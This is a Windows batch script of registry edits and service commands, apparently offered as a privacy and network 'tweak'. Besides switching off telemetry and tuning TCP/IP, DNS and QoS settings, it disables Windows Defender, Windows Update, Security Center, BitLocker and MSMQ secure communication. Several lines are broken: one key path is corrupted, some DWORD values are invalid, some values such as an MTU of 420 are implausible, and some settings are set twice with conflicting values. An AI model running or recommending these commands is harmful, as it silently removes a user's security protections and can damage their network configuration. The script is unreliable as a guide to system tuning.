Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CredUI" /v "DisablePasswordReveal" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization" /v "SystemSettingsDownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\wuauserv" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\OneDrive" /v "PreventNetworkTrafficPreUserSignIn" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpyNetReporting" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IRPStackSize" /t REG_DWORD /d "0000001e" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "00010000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SizReqBuf" /t REG_DWORD /d "51319" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "00000005" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "StrictTimeWaitSeqCheck" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableIPSourceRouting" /t REG_DWORD /d "00000008" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "000003e8" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPInitalRtt" /t REG_DWORD /d "00046325" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "00000002" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "de7a" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "00000042d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "00000042d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IPAutoconfigurationEnabled" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "DisableTaskOffload" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableDCA" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnablePMTUBHDetect" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnablePMTUDiscovery" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableRSS" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableTCPA" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableWsd" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "IRPStackSize" /t REG_DWORD /d "0000001e" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MaxHashTableSize" /t REG_DWORD /d "00010000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "SackOpts" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "SizReqBuf" /t REG_DWORD /d "51319" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "SynAttackProtect" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPNoDelay" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "Tcp1323Opts" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "00000004" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "StrictTimeWaitSeqCheck" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "DisableIPSourceRouting" /t REG_DWORD /d "00000008" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "KeepAliveInterval" /t REG_DWORD /d "000003e8" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "IPAutoconfigurationEnabled" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPInitalRtt" /t REG_DWORD /d "00046325" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpMaxDupAcks" /t REG_DWORD /d "00000002" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpNumConnections" /t REG_DWORD /d "de7a" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpTimedWaitDelay" /t REG_DWORD /d "00000042d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpFinWait2Delay" /t REG_DWORD /d "00000042d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPDelAckTicks" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "DefaultTTL" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "239" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "240" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "1740" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "1741" /f
Reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "10" /f
Reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "10" /f
Reg.exe add "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "10" /f
Reg.exe add "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "000f0000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "00000001" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "00000180" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "0000FA00" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "0000012D" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxConnectRetransmissions" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "CongestionAlgorithm" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MultihopSets" /t REG_DWORD /d "15" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "EnableAutoDoh" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrDisableNagleentControlSet\Services\AFD\Parameters" /v "DoNotHoldNicBuffers" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DisableRawSecurity" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "NonBlockingSendSpecialBuffering" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "IgnorePushBitOnReceives" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicSendBufferDisable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters\OCMsetup" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters\Security" /v "SecureDSCommunication" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters\setup" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "80" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "170372" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\System" /v "HiberbootEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched" /v "MaxOutstandingSends" /t REG_DWORD /d "1073741824" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingConforming" /v "ServiceTypeBestEffort" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingConforming" /v "ServiceTypeControlledLoad" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingConforming" /v "ServiceTypeGuaranteed" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingConforming" /v "ServiceTypeNetworkControl" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingConforming" /v "ServiceTypeQualitative" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingNonConforming" /v "ServiceTypeBestEffort" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingNonConforming" /v "ServiceTypeControlledLoad" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingNonConforming" /v "ServiceTypeGuaranteed" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingNonConforming" /v "ServiceTypeNetworkControl" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\DiffservByteMappingNonConforming" /v "ServiceTypeQualitative" /t REG_DWORD /d "99" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\UserPriorityMapping" /v "ServiceTypeNonConforming" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\UserPriorityMapping" /v "ServiceTypeBestEffort" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\UserPriorityMapping" /v "ServiceTypeControlledLoad" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\UserPriorityMapping" /v "ServiceTypeGuaranteed" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\UserPriorityMapping" /v "ServiceTypeNetworkControl" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Psched\UserPriorityMapping" /v "ServiceTypeQualitative" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "170372" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\BITS" /v "EnableBITSMaxBandwidth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\NetCache" /v "PeerCachingLatencyThreshold" /t REG_DWORD /d "268435456" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\PeerDist\Service" /v "Enable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v "UpdateSecurityLevel" /t REG_DWORD /d "598" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v "RegistrationTtl" /t REG_DWORD /d "1117034098" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Network Connections" /v "NC_AllowNetBridge_NLA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Network Connections" /v "NC_AllowAdvancedTCPIPConfig" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SizReqBuf" /t REG_DWORD /d "53819" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "23" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "00000008" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPInitalRtt" /t REG_DWORD /d "00049697" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "00000076d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "00000076d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "33" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "420" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "412" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "SizReqBuf" /t REG_DWORD /d "53819" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "23" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "00000008" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPInitalRtt" /t REG_DWORD /d "00049697" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpTimedWaitDelay" /t REG_DWORD /d "00000076d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpFinWait2Delay" /t REG_DWORD /d "00000076d" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "DefaultTTL" /t REG_DWORD /d "33" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MTU" /t REG_DWORD /d "420" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MSS" /t REG_DWORD /d "412" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "191" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "215" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "FastCopyReceiveThreshold" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "FastSendDatagramThreshold" /t REG_DWORD /d "2048" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "PriorityBoost" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultSendWindow" /t REG_DWORD /d "415029" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultReceiveWindow" /t REG_DWORD /d "415029" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaxFastCopyTransmit" /t REG_DWORD /d "296" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaxFastTransmit" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "TransmitWorker" /t REG_DWORD /d "50" /f

sc config "fax" start=disabled & sc stop "fax"
sc config "mapsbroker" start=disabled & sc stop "mapsbroker"
sc config "spooler" start=disabled & sc stop "spooler"
sc config "icssvc" start=disabled & sc stop "icssvc"
sc config "wscsvc" start=disabled & sc stop "wscsvc"
sc config "certpropsvc" start=disabled & sc stop "certpropsvc"
sc config "wbiosrvc" start=disabled & sc stop "wbiosrvc"
sc config "wuauserv" start=manual & sc stop "wuauserv"
sc config "bdesvc" start=disabled & sc stop "bdesvc"
sc config "stisvc" start=disabled & sc stop "stisvc"
sc config "lmhosts" start=disabled & sc stop "lmhosts"
sc config "wpcmonsvc" start=disabled & sc stop "wpcmonsvc"
sc config "wersvc" start=disabled & sc stop "wersvc"
sc config "wisvc" start=disabled & sc stop "wisvc"
sc config "dps" start=disabled & sc stop "dps"
sc config "sharedaccess" start=disabled & sc stop "sharedaccess"
sc config "pcasvc" start=disabled & sc stop "pcasvc"
sc config "retaildemo" start=disabled & sc stop "retaildemo"
